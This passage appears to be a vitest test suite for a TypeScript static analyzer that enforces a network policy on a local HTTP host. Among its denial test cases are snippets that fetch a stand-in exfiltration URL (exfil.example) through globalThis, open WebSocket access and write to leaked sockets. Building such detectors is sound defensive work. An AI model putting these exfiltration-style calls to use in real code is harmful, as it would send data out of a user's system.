import { readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

import ts from 'typescript';
import { describe, expect, it } from 'vitest';

import {
  analyzeNetworkPolicy,
  DEFAULT_FIXPOINT_CEILING,
  inspectNetworkPolicy,
  isValueRead,
  isWriteTarget,
  POLICY_KEY_NAMES,
  STATIC_KEY_CEILING,
  type NetworkPolicyResult,
  type ReasonCode,
} from './support/d3-network-policy.js';
import {
  D3_REGRESSION_MATRIX,
  REAL_HOST_REPLICA,
  REGRESSION_CATEGORIES,
  reversePropagationChain,
  type RegressionRow,
} from './support/d3-regression-matrix.js';

/**
 * Cockpit D3 network policy — mechanism tests and the semantic regression matrix.
 *
 * The detector under test is `tests/cockpit-host/support/d3-network-policy.ts`;
 * the rows live in `tests/cockpit-host/support/d3-regression-matrix.ts`. The
 * purity suite integrates the detector over the real host tree separately.
 */

const hostDir = fileURLToPath(new URL('../../src/cockpit-host/', import.meta.url));
const detectorPath = fileURLToPath(new URL('./support/d3-network-policy.ts', import.meta.url));

const NS = `import http from 'node:http';`;
const L = `(request: http.IncomingMessage, response: http.ServerResponse) => { response.end('ok'); }`;

const describeFindings = (result: NetworkPolicyResult): string =>
  result.findings.map((finding) => `${finding.reason}@${String(finding.line)}:${String(finding.column)} ${finding.text}`).join('; ');

/** Every node under `root` (depth-first) that satisfies `predicate`. */
function collectNodes<T extends ts.Node>(root: ts.Node, predicate: (node: ts.Node) => node is T): T[] {
  const found: T[] = [];
  const visit = (node: ts.Node): void => {
    if (predicate(node)) found.push(node);
    ts.forEachChild(node, visit);
  };
  visit(root);
  return found;
}

const identifiersNamed = (root: ts.Node, text: string): ts.Identifier[] =>
  collectNodes(root, ts.isIdentifier).filter((id) => id.text === text);

const occurrences = (haystack: string, needle: string): number => haystack.split(needle).length - 1;

// ---------------------------------------------------------------------------
// valueSymbolOf
// ---------------------------------------------------------------------------

describe('D3 network policy valueSymbolOf is the single symbol-resolution path', () => {
  it('resolves a shorthand property value to the local binding, not the property', () => {
    const inspection = inspectNetworkPolicy(`const server = 1;\nconst box = { server };`);
    const [declared, shorthand] = identifiersNamed(inspection.sourceFile, 'server');
    expect(declared).toBeDefined();
    expect(shorthand).toBeDefined();
    if (declared === undefined || shorthand === undefined) return;
    expect(ts.isShorthandPropertyAssignment(shorthand.parent)).toBe(true);
    const declaredSymbol = inspection.valueSymbolOf(declared);
    expect(inspection.valueSymbolOf(shorthand)).toBe(declaredSymbol);
    // The plain checker call returns the *property* symbol here — the mismatch F-3 named.
    expect(inspection.checker.getSymbolAtLocation(shorthand)).not.toBe(declaredSymbol);
  });

  it('resolves an export specifier to its local target', () => {
    const inspection = inspectNetworkPolicy(`const server = 1;\nexport { server as s };`);
    const [declared, local] = identifiersNamed(inspection.sourceFile, 'server');
    expect(declared).toBeDefined();
    expect(local).toBeDefined();
    if (declared === undefined || local === undefined) return;
    expect(ts.isExportSpecifier(local.parent)).toBe(true);
    expect(inspection.valueSymbolOf(local)).toBe(inspection.valueSymbolOf(declared));
    expect(inspection.valueSymbolOf(local.parent)).toBe(inspection.valueSymbolOf(declared));
  });

  it('resolves ordinary identifiers by binder identity across scopes', () => {
    const inspection = inspectNetworkPolicy(`const k = 1;\n{ const k = 2; k; }\nk;`);
    const [outerDecl, innerDecl, innerUse, outerUse] = identifiersNamed(inspection.sourceFile, 'k');
    expect(outerDecl && innerDecl && innerUse && outerUse).toBeTruthy();
    if (!outerDecl || !innerDecl || !innerUse || !outerUse) return;
    expect(inspection.valueSymbolOf(innerUse)).toBe(inspection.valueSymbolOf(innerDecl));
    expect(inspection.valueSymbolOf(outerUse)).toBe(inspection.valueSymbolOf(outerDecl));
    expect(inspection.valueSymbolOf(innerDecl)).not.toBe(inspection.valueSymbolOf(outerDecl));
  });

  it('is the only checker symbol-resolution path in the detector source', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'checker.getSymbolAtLocation(')).toBe(1);
    expect(occurrences(detector, 'checker.getShorthandAssignmentValueSymbol(')).toBe(1);
    expect(occurrences(detector, 'checker.getExportSpecifierLocalTargetSymbol(')).toBe(2);
    expect(occurrences(detector, 'getSymbolsInScope')).toBe(0);
    expect(occurrences(detector, 'getAliasedSymbol')).toBe(0);
    expect(occurrences(detector, 'getTypeAtLocation')).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// isValueRead
// ---------------------------------------------------------------------------

describe('D3 network policy isValueRead separates runtime reads from names and types', () => {
  const source = `
import http, { type Server as S, createServer } from 'node:http';
import * as ns from 'node:url';
type T = { server: number; m(): void };
interface I { server: number }
enum E { server }
namespace N { export const server = 1; }
class C { server = 1; get g() { return 1; } set g(v: number) {} m() {} }
function server(server: number, { server: alias }: { server: number }): http.Server | null { return null; }
const o = { server: 1, [String(1)]: 2 };
let v: typeof server;
label: for (;;) { break label; }
server(o.server, { server: 1 });
const { server: renamed } = o;
export { renamed as server };
import.meta;
`;
  const inspection = inspectNetworkPolicy(source);
  const reads = identifiersNamed(inspection.sourceFile, 'server').filter(isValueRead);

  it('treats exactly the runtime reads as value reads', () => {
    const texts = reads.map((id) => {
      const parent = id.parent;
      return ts.SyntaxKind[parent.kind];
    });
    expect(texts).toEqual(['CallExpression']);
    // `export { renamed as server }`: the local name `renamed` is the value read, the exported name is not.
    const renamed = identifiersNamed(inspection.sourceFile, 'renamed').filter(isValueRead);
    expect(renamed.map((id) => ts.SyntaxKind[id.parent.kind])).toEqual(['ExportSpecifier']);
  });

  it('excludes declaration names, keys, member names, type positions, labels and import forms', () => {
    const excluded = identifiersNamed(inspection.sourceFile, 'server').filter((id) => !isValueRead(id));
    const kinds = new Set(excluded.map((id) => ts.SyntaxKind[id.parent.kind]));
    for (const kind of [
      'PropertySignature',
      'EnumMember',
      'VariableDeclaration',
      'PropertyDeclaration',
      'FunctionDeclaration',
      'Parameter',
      'BindingElement',
      'PropertyAssignment',
      'PropertyAccessExpression',
      'TypeQuery',
    ]) {
      expect(kinds, kind).toContain(kind);
    }
    expect(identifiersNamed(inspection.sourceFile, 'label').some(isValueRead)).toBe(false);
    expect(identifiersNamed(inspection.sourceFile, 'S').some(isValueRead)).toBe(false);
    expect(identifiersNamed(inspection.sourceFile, 'ns').some(isValueRead)).toBe(false);
    expect(identifiersNamed(inspection.sourceFile, 'meta').some(isValueRead)).toBe(false);
  });

  it('treats a class extends expression as a value read but implements as a type', () => {
    const inspected = inspectNetworkPolicy(`class A {}\ninterface I {}\nclass B extends A implements I {}`);
    expect(identifiersNamed(inspected.sourceFile, 'A').filter(isValueRead)).toHaveLength(1);
    expect(identifiersNamed(inspected.sourceFile, 'I').filter(isValueRead)).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Static-key resolver
// ---------------------------------------------------------------------------

describe('D3 network policy static-key resolver returns exactly RESOLVED/NOT_CAPABILITY/INDETERMINATE', () => {
  const firstElementKey = (source: string): ReturnType<ReturnType<typeof inspectNetworkPolicy>['resolveStaticKey']> => {
    const inspection = inspectNetworkPolicy(source);
    const [access] = collectNodes(inspection.sourceFile, ts.isElementAccessExpression);
    expect(access).toBeDefined();
    if (access === undefined) throw new Error('no element access');
    return inspection.resolveStaticKey(access.argumentExpression);
  };

  it('resolves literals, templates, concatenations, unique consts and wrappers', () => {
    expect(firstElementKey(`o['listen'];`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`o[\`listen\`];`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`const A = 'lis'; o[\`\${A}ten\`];`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`o['lis' + 'ten'];`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`const K = 'listen'; o[K];`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`const A = 'lis'; const B = A + 'ten'; o[((B as string)!) satisfies string];`)).toEqual({
      kind: 'RESOLVED',
      value: 'listen',
    });
    expect(firstElementKey(`o[0];`)).toEqual({ kind: 'RESOLVED', value: '0' });
  });

  it('returns NOT_CAPABILITY once a folded string exceeds the policy-name ceiling', () => {
    expect(STATIC_KEY_CEILING).toBe(Math.max(...POLICY_KEY_NAMES.map((name) => name.length)));
    expect(STATIC_KEY_CEILING).toBe('createServer'.length);
    expect(firstElementKey(`o['${'x'.repeat(STATIC_KEY_CEILING + 1)}'];`)).toEqual({ kind: 'NOT_CAPABILITY' });
    expect(firstElementKey(`o['${'x'.repeat(STATIC_KEY_CEILING)}'];`).kind).toBe('RESOLVED');
    expect(firstElementKey(`const A = '${'x'.repeat(STATIC_KEY_CEILING)}'; o[A + 'y'];`)).toEqual({ kind: 'NOT_CAPABILITY' });
  });

  it('returns INDETERMINATE for let, written const, parameters, cycles, calls and destructured bindings', () => {
    expect(firstElementKey(`let K = 'listen'; o[K];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`const K = 'listen'; (K as any) = 'x'; o[K];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`function f(K: string) { o[K]; }`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`const A: string = B; const B: string = A; o[A];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`o[String(1)];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`const { K } = { K: 'listen' }; o[K];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`declare const K: string; o[K];`)).toEqual({ kind: 'INDETERMINATE' });
    expect(firstElementKey(`const K = 'lis' + Math.random(); o[K];`)).toEqual({ kind: 'INDETERMINATE' });
  });

  it('is scope-sensitive by binder identity, not by name', () => {
    expect(firstElementKey(`const K = 'request'; { const K = 'listen'; o[K]; }`)).toEqual({ kind: 'RESOLVED', value: 'listen' });
    expect(firstElementKey(`const K = 'listen'; function f(K: string) { o[K]; }`)).toEqual({ kind: 'INDETERMINATE' });
  });

  it('terminates on a long const chain and a dense concatenation tree', () => {
    const chain = Array.from({ length: 300 }, (_, i) => `const k${String(i + 1)} = k${String(i)};`).join('\n');
    const key = firstElementKey(`const k0 = 'listen';\n${chain}\no[k300];`);
    expect(['RESOLVED', 'INDETERMINATE']).toContain(key.kind);
    const tree = Array.from({ length: 2_000 }, () => `'x'`).join(' + ');
    expect(firstElementKey(`o[${tree}];`).kind).not.toBe('RESOLVED');
  });

  it('is the only key resolver in the detector source', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function resolveKeyInner(')).toBe(1);
    expect(occurrences(detector, 'const resolveStaticKey = ')).toBe(1);
    expect(occurrences(detector, 'STATIC_KEY_CEILING')).toBeGreaterThan(0);
    expect(occurrences(detector, 'staticStringOf')).toBe(0);
    expect(occurrences(detector, 'collectStringConsts')).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Write inventory
// ---------------------------------------------------------------------------

describe('D3 network policy write inventory counts binder-resolved writes once', () => {
  const inspection = inspectNetworkPolicy(`
function f() {}
let g = 1;
(f as any) = 1;
(f as any) += 1;
(f as any)++;
--(f as any);
[(f as any)] = [1];
({ f } = { f: 1 } as any);
({ x: (f as any) } = { x: 1 } as any);
for (f as any in {}) {}
for (f as any of []) {}
const h = f;
f;
g = 2;
`);
  const symbolOf = (text: string): ts.Symbol => {
    const [id] = identifiersNamed(inspection.sourceFile, text);
    const symbol = id === undefined ? undefined : inspection.valueSymbolOf(id);
    if (symbol === undefined) throw new Error(`no symbol for ${text}`);
    return symbol;
  };

  it('counts assignment, compound, update, destructuring-assignment, for-in and for-of targets through wrappers', () => {
    expect(inspection.writeCountOf(symbolOf('f'))).toBe(9);
    expect(inspection.writeCountOf(symbolOf('g'))).toBe(1);
    expect(inspection.writeCountOf(symbolOf('h'))).toBe(0);
  });

  it('exposes isWriteTarget for member accesses inside patterns', () => {
    const inspected = inspectNetworkPolicy(`declare const o: any;\n[o.a] = [1];\n({ b: o.c } = {} as any);\no.d;\nuse([o.e]);`);
    const accesses = collectNodes(inspected.sourceFile, ts.isPropertyAccessExpression);
    expect(accesses.map((access) => isWriteTarget(access))).toEqual([true, true, false, false]);
  });
});

// ---------------------------------------------------------------------------
// Listener boundary
// ---------------------------------------------------------------------------

describe('D3 network policy createServer listener boundary', () => {
  const factsOfParameter = (source: string, name: string): readonly string[] => {
    const inspection = inspectNetworkPolicy(source);
    const parameter = collectNodes(inspection.sourceFile, ts.isParameter).find((p) => ts.isIdentifier(p.name) && p.name.text === name);
    const symbol = parameter === undefined ? undefined : inspection.valueSymbolOf(parameter.name);
    if (symbol === undefined) throw new Error(`no parameter ${name}`);
    return inspection.factsOf(symbol);
  };

  it('roots exactly parameter 0 as REQUEST and parameter 1 as RESPONSE', () => {
    const source = `${NS}\nhttp.createServer((a, b, c, d) => { a; b; c; d; });`;
    expect(factsOfParameter(source, 'a')).toEqual(['REQUEST:ROOT']);
    expect(factsOfParameter(source, 'b')).toEqual(['RESPONSE:ROOT']);
    expect(factsOfParameter(source, 'c')).toEqual([]);
    expect(factsOfParameter(source, 'd')).toEqual([]);
  });

  it('leaves parameters at index >= 2 unprivileged even when they misbehave', () => {
    const result = analyzeNetworkPolicy(`${NS}\nhttp.createServer((request, response, extra: any) => { extra.socket.write('x'); response.end(); });`);
    expect(result.verdict, describeFindings(result)).toBe('ALLOW');
  });

  it('requires a CallExpression with exactly one normalized function argument', () => {
    for (const [source, reason] of [
      [`${NS}\nhttp.createServer();`, 'CREATE_SERVER_ARITY'],
      [`${NS}\nhttp.createServer({}, ${L});`, 'CREATE_SERVER_ARITY'],
      [`${NS}\nnew http.createServer(${L});`, 'CREATE_SERVER_NEW'],
      [`${NS}\nlet h = ${L};\nhttp.createServer(h);`, 'LISTENER_NOT_FUNCTION'],
      [`${NS}\nhttp.createServer(({ url }, response) => {});`, 'LISTENER_PARAMETER_PATTERN'],
      [`${NS}\nhttp.createServer((...args: any[]) => {});`, 'LISTENER_PARAMETER_PATTERN'],
      [`${NS}\nhttp.createServer(function (this: unknown, request, response) {});`, 'LISTENER_THIS_PARAMETER'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, source).toBe('DENY');
      expect(result.reasons, source).toContain(reason);
    }
  });

  it('normalizes the listener through wrappers, const spines and unique FunctionDeclarations', () => {
    for (const source of [
      `${NS}\nhttp.createServer((${L}) as any);`,
      `${NS}\nconst h1 = ${L};\nconst h2 = h1!;\nhttp.createServer(h2);`,
      `${NS}\nfunction handle(request: http.IncomingMessage, response: http.ServerResponse) { response.end(request.url); }\nhttp.createServer(handle);`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, `${source}\n${describeFindings(result)}`).toBe('ALLOW');
    }
  });

  it('roots the parameters of a FunctionDeclaration listener', () => {
    const source = `${NS}\nfunction handle(q: http.IncomingMessage, s: http.ServerResponse) { s.end(q.url); }\nhttp.createServer(handle);`;
    expect(factsOfParameter(source, 'q')).toEqual(['REQUEST:ROOT']);
    expect(factsOfParameter(source, 's')).toEqual(['RESPONSE:ROOT']);
  });
});

// ---------------------------------------------------------------------------
// Options argument
// ---------------------------------------------------------------------------

describe('D3 network policy denies every createServer options form (frozen: OPTIONS = DENY)', () => {
  it('denies a second argument regardless of its shape', () => {
    for (const options of ['{}', '{ IncomingMessage: class {} }', '{ ServerResponse: class {} }', '{ shouldUpgradeCallback: () => true }', 'undefined', 'opts']) {
      const result = analyzeNetworkPolicy(`${NS}\ndeclare const opts: any;\nhttp.createServer(${options}, ${L});`);
      expect(result.reasons, options).toContain('CREATE_SERVER_ARITY');
    }
  });

  it('performs no options analysis: the detector names no option keys', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    for (const forbidden of ['IncomingMessage', 'ServerResponse', 'shouldUpgradeCallback', 'prototype']) {
      expect(occurrences(detector, forbidden), forbidden).toBe(0);
    }
  });
});

// ---------------------------------------------------------------------------
// Local callee eligibility and propagation
// ---------------------------------------------------------------------------

describe('D3 network policy local callee eligibility governs propagation and escape alike', () => {
  const factsOfParameter = (source: string, name: string): readonly string[] => {
    const inspection = inspectNetworkPolicy(source);
    const parameter = collectNodes(inspection.sourceFile, ts.isParameter).find((p) => ts.isIdentifier(p.name) && p.name.text === name);
    const symbol = parameter === undefined ? undefined : inspection.valueSymbolOf(parameter.name);
    if (symbol === undefined) throw new Error(`no parameter ${name}`);
    return inspection.factsOf(symbol);
  };

  it('propagates into an immutable FunctionDeclaration parameter as PARAM', () => {
    const source = `${NS}\nfunction f(res: http.ServerResponse) { res.end(); }\nhttp.createServer((request, response) => { f(response); });`;
    expect(factsOfParameter(source, 'res')).toEqual(['RESPONSE:PARAM']);
    expect(analyzeNetworkPolicy(source).verdict).toBe('ALLOW');
  });

  it('rejects a written FunctionDeclaration as a propagation callee and denies the call site', () => {
    const source = `${NS}\nfunction f(res: http.ServerResponse) { res.end(); }\n(f as any) = null;\nhttp.createServer((request, response) => { f(response); });`;
    expect(factsOfParameter(source, 'res')).toEqual([]);
    const result = analyzeNetworkPolicy(source);
    expect(result.reasons).toContain('RESPONSE_ESCAPE');
  });

  it('rejects rest, pattern and missing parameters for a privileged argument', () => {
    for (const callee of ['function f(...a: unknown[]) {}', 'function f({ x }: any) {}', 'function f() {}']) {
      const result = analyzeNetworkPolicy(`${NS}\n${callee}\nhttp.createServer((request, response) => { f(response); });`);
      expect(result.reasons, callee).toContain('RESPONSE_ESCAPE');
    }
  });

  it('uses one predicate: no fact is ever produced for a call site that is denied as an escape', () => {
    const inspection = inspectNetworkPolicy(
      `${NS}\nlet f = (res: any) => { res; };\nfunction g(res: any) { res; }\nhttp.createServer((request, response) => { f(response); g(response); });`,
    );
    const parameters = collectNodes(inspection.sourceFile, ts.isParameter).filter((p) => ts.isIdentifier(p.name) && p.name.text === 'res');
    const facts = parameters.map((p) => {
      const symbol = inspection.valueSymbolOf(p.name);
      return symbol === undefined ? [] : inspection.factsOf(symbol);
    });
    expect(facts).toEqual([[], ['RESPONSE:PARAM']]);
    expect(inspection.result.findings.filter((finding) => finding.reason === 'RESPONSE_ESCAPE')).toHaveLength(1);
  });

  it('is the only parameter-propagation predicate in the detector source', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function resolvePropagationParameter(')).toBe(1);
    expect(occurrences(detector, 'resolvePropagationParameter(ctx, ')).toBe(2);
  });
});

// ---------------------------------------------------------------------------
// Factory confinement
// ---------------------------------------------------------------------------

describe('D3 network policy factory confinement', () => {
  const factoryState = (source: string, name: string): { confined: boolean; result: NetworkPolicyResult } => {
    const inspection = inspectNetworkPolicy(source);
    const [id] = identifiersNamed(inspection.sourceFile, name);
    const symbol = id === undefined ? undefined : inspection.valueSymbolOf(id);
    if (symbol === undefined) throw new Error(`no binding ${name}`);
    return { confined: inspection.isConfinedFactory(symbol), result: inspection.result };
  };

  it('confines the real exported factory and roots its const consumer as SERVER', () => {
    const source = `${NS}\nexport function createCockpitServer(): http.Server { return http.createServer(${L}); }\nconst server = createCockpitServer();\nserver.listen(1);`;
    const { confined, result } = factoryState(source, 'createCockpitServer');
    expect(confined).toBe(true);
    expect(result.verdict, describeFindings(result)).toBe('ALLOW');
    const inspection = inspectNetworkPolicy(source);
    const [serverDecl] = identifiersNamed(inspection.sourceFile, 'server');
    const serverSymbol = serverDecl === undefined ? undefined : inspection.valueSymbolOf(serverDecl);
    expect(serverSymbol && inspection.factsOf(serverSymbol)).toEqual(['SERVER:ROOT']);
  });

  it('does not confine mixed returns, escaped identities, async/generator or IIFE/method/object-held functions', () => {
    for (const [source, name] of [
      [`${NS}\nfunction make(x: boolean) { if (x) return http.createServer(${L}); return null; }`, 'make'],
      [`${NS}\nfunction make() { return http.createServer(${L}); }\nconst fns = [make];`, 'make'],
      [`${NS}\nfunction make() { return http.createServer(${L}); }\nmake.call(null);`, 'make'],
      [`${NS}\nasync function make() { return http.createServer(${L}); }`, 'make'],
      [`${NS}\nfunction* make() { return http.createServer(${L}); }`, 'make'],
      [`${NS}\nconst host = { make: () => http.createServer(${L}) };`, 'make'],
      [`${NS}\nfunction id(s: http.Server) { return s; }`, 'id'],
    ] as const) {
      const { confined, result } = factoryState(source, name);
      expect(confined, source).toBe(false);
      if (source.includes('createServer(')) expect(result.reasons, source).toContain('SERVER_UNCONFINED_RETURN');
    }
  });

  it('does not confine a factory whose return is a PARAM-derived server alias', () => {
    const { confined, result } = factoryState(`${NS}\nconst server = http.createServer(${L});\nfunction id(s: http.Server) { const t = s; return t; }\nid(server);`, 'id');
    expect(confined).toBe(false);
    expect(result.reasons).toContain('SERVER_UNCONFINED_RETURN');
  });

  it('confines factories returning other confined factories or rooted const aliases', () => {
    const source = `${NS}\nconst server = http.createServer(${L});\nfunction get() { return server; }\nfunction outer() { return get(); }\nouter().listen(1);`;
    expect(factoryState(source, 'get').confined).toBe(true);
    expect(factoryState(source, 'outer').confined).toBe(true);
    expect(factoryState(source, 'outer').result.verdict).toBe('ALLOW');
  });

  it('has no function-level factory set outside the fixpoint', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'serverFactories')).toBe(0);
    expect(occurrences(detector, 'function isConfinedFactory(')).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// Positive policies
// ---------------------------------------------------------------------------

describe('D3 network policy positive policies deny every non-allow-listed operation', () => {
  it('denies destructuring of any proven target', () => {
    for (const [source, reason] of [
      [`${NS}\nconst { listen } = http.createServer(${L});`, 'SERVER_DESTRUCTURING'],
      [`${NS}\nhttp.createServer((request, response) => { const { socket } = request; });`, 'REQUEST_DESTRUCTURING'],
      [`${NS}\nhttp.createServer((request, response) => { const [a] = response as any; });`, 'RESPONSE_DESTRUCTURING'],
      [`${NS}\nhttp.createServer((request, response) => { let s; ({ socket: s } = response); });`, 'RESPONSE_DESTRUCTURING'],
    ] as const) {
      expect(analyzeNetworkPolicy(source).reasons, source).toContain(reason);
    }
  });

  it('denies export { server } and every other proven-target export', () => {
    const base = `${NS}\nconst server = http.createServer(${L});\n`;
    for (const tail of [`export { server };`, `export { server as s };`, `export default server;`, `const a = server;\nexport { a };`]) {
      expect(analyzeNetworkPolicy(base + tail).reasons, tail).toContain('SERVER_EXPORT');
    }
    expect(analyzeNetworkPolicy(`${NS}\nexport const server = http.createServer(${L});`).reasons).toContain('SERVER_EXPORT');
  });

  it('has no dangerous-member-name model: the allow-lists are the only member tables', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    for (const legacy of [
      'reqResSymbols',
      'receiverIsReqRes',
      'STATIC_SOCKET_ACQUISITION_NAMES',
      'RECEIVER_INDEPENDENT_ASSIGNMENT_NAMES',
      'META_MUTATION_APIS',
      'scanReqResBindingPattern',
      'scanReqResAssignmentTarget',
      'scanSocketAssignmentTarget',
      "'socket'",
      "'connection'",
    ]) {
      expect(occurrences(detector, legacy), legacy).toBe(0);
    }
  });
});

// ---------------------------------------------------------------------------
// Fixpoint
// ---------------------------------------------------------------------------

describe('D3 network policy fixpoint is explicit, bounded and fail-closed', () => {
  it('converges on the real host replica and reports iterations within the derived bound', () => {
    const inspection = inspectNetworkPolicy(REAL_HOST_REPLICA);
    expect(inspection.result.fixpoint.state).toBe('CONVERGED');
    expect(inspection.result.fixpoint.iterations).toBeLessThanOrEqual(inspection.fixpointBound);
    expect(inspection.result.fixpoint.bound).toBe(inspection.fixpointBound);
    expect(inspection.fixpointBound).toBeGreaterThanOrEqual(inspection.declaredSymbolCount * 9 + 1);
    expect(inspection.fixpointBound).toBeLessThanOrEqual(DEFAULT_FIXPOINT_CEILING);
  });

  it('needs more passes for a longer reverse chain and converges monotonically', () => {
    const short = analyzeNetworkPolicy(reversePropagationChain(2));
    const long = analyzeNetworkPolicy(reversePropagationChain(8));
    expect(short.fixpoint.state).toBe('CONVERGED');
    expect(long.fixpoint.state).toBe('CONVERGED');
    expect(long.fixpoint.iterations).toBeGreaterThan(short.fixpoint.iterations);
    expect(long.verdict, describeFindings(long)).toBe('ALLOW');
  });

  it('reports EXHAUSTED and denies immediately when the ceiling is reached, without Phase-B findings', () => {
    const result = analyzeNetworkPolicy(reversePropagationChain(8), { fixpointCeiling: 3 });
    expect(result.fixpoint).toEqual({ state: 'EXHAUSTED', iterations: 3, bound: 3 });
    expect(result.verdict).toBe('DENY');
    expect(result.reasons).toEqual(['FIXPOINT_EXHAUSTED']);
  });

  it('exhaustion denies a source that is otherwise allowed and never masks it as ALLOW', () => {
    const allowed = analyzeNetworkPolicy(REAL_HOST_REPLICA);
    const exhausted = analyzeNetworkPolicy(REAL_HOST_REPLICA, { fixpointCeiling: 1 });
    expect(allowed.verdict).toBe('ALLOW');
    expect(exhausted.verdict).toBe('DENY');
    expect(exhausted.fixpoint.state).toBe('EXHAUSTED');
  });

  it('is the only fixpoint and the only provenance producer in the detector source', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function runFixpoint(')).toBe(1);
    expect(occurrences(detector, 'function addFact(')).toBe(1);
    expect(occurrences(detector, 'ctx.facts.set(')).toBe(1);
    expect(occurrences(detector, 'facts.add(')).toBe(1);
    expect(occurrences(detector, "'CONVERGED'")).toBeGreaterThan(0);
    expect(occurrences(detector, "'EXHAUSTED'")).toBeGreaterThan(0);
  });
});

// ---------------------------------------------------------------------------
// Receiver-call result authority inheritance (PR #67 F2 / F3)
// ---------------------------------------------------------------------------

describe('D3 network policy receiver-call result authority inheritance (PR #67 F2/F3)', () => {
  const withServer = (rest: string): string => `${NS}\nconst server = http.createServer(${L});\n${rest}`;
  const inListener = (body: string): string => `${NS}\nhttp.createServer((request, response) => {\n  ${body}\n});`;

  const factsOfConst = (source: string, name: string): { facts: readonly string[]; result: NetworkPolicyResult; bound: number } => {
    const inspection = inspectNetworkPolicy(source);
    const declaration = collectNodes(inspection.sourceFile, ts.isVariableDeclaration).find((d) => ts.isIdentifier(d.name) && d.name.text === name);
    const symbol = declaration === undefined ? undefined : inspection.valueSymbolOf(declaration.name);
    if (symbol === undefined) throw new Error(`no const ${name}`);
    return { facts: inspection.factsOf(symbol), result: inspection.result, bound: inspection.fixpointBound };
  };

  it('F2: denies every proven-target call-result witness through the existing target policy', () => {
    for (const [source, reason] of [
      [withServer(`export const leaked = server.listen(4317, '127.0.0.1');`), 'SERVER_EXPORT'],
      [withServer(`server.listen(1).on('connection', (socket) => { socket.write('x'); });`), 'SERVER_MEMBER'],
      [withServer(`server.close().on('close', () => {});`), 'SERVER_MEMBER'],
      [inListener(`response.setHeader('a', 'b').socket;`), 'RESPONSE_MEMBER'],
      [inListener(`response.end('x').socket;`), 'RESPONSE_MEMBER'],
      [inListener(`const r2 = response.setHeader('a', 'b');\nuse(r2);`), 'RESPONSE_ESCAPE'],
      [withServer(`use(server.listen(1));`), 'SERVER_ESCAPE'],
      [`${NS}\nhttp.createServer(${L}).listen(1).on('x', () => {});`, 'SERVER_MEMBER'],
      [withServer(`const leaked = server.listen(1);\nuse(leaked);`), 'SERVER_ESCAPE'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, source).toBe('DENY');
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
      expect(result.fixpoint.state, source).toBe('CONVERGED');
    }
  });

  it('F3: denies every global-root call-result witness through the existing global-receiver rules', () => {
    for (const [source, reason] of [
      [`globalThis.valueOf().fetch('https://exfil.example/');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`globalThis.global.valueOf().fetch('https://exfil.example/');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`const g = globalThis.valueOf();`, 'GLOBAL_RECEIVER_ESCAPE'],
      [`window['valueOf']().WebSocket;`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`use(self.valueOf());`, 'GLOBAL_RECEIVER_ESCAPE'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, source).toBe('DENY');
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
    }
  });

  it('F3: follows optional calls of permitted global members exactly like plain calls, with one finding each', () => {
    for (const [source, reason] of [
      [`globalThis.valueOf?.().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`globalThis?.valueOf?.().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`globalThis?.valueOf().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`globalThis['valueOf']?.().fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`globalThis['valueOf']?.().WebSocket;`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`(globalThis.valueOf?.() as any).fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`globalThis.valueOf?.().self.fetch('x');`, 'GLOBAL_RECEIVER_NETWORK_MEMBER'],
      [`const g = globalThis.valueOf?.();`, 'GLOBAL_RECEIVER_ESCAPE'],
      [`use(globalThis.valueOf?.());`, 'GLOBAL_RECEIVER_ESCAPE'],
      [`function g() { return window.valueOf?.(); }`, 'GLOBAL_RECEIVER_ESCAPE'],
      [`declare const k: string;\nglobalThis.valueOf?.()[k];`, 'GLOBAL_RECEIVER_RUNTIME_KEY'],
      [`declare const k: string;\nglobalThis[k]?.().fetch('x');`, 'GLOBAL_RECEIVER_RUNTIME_KEY'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.verdict, source).toBe('DENY');
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([reason]);
      expect(result.findings, `${source}\n${describeFindings(result)}`).toHaveLength(1);
    }
    for (const source of [
      `globalThis.valueOf?.();`,
      `void globalThis.valueOf?.();`,
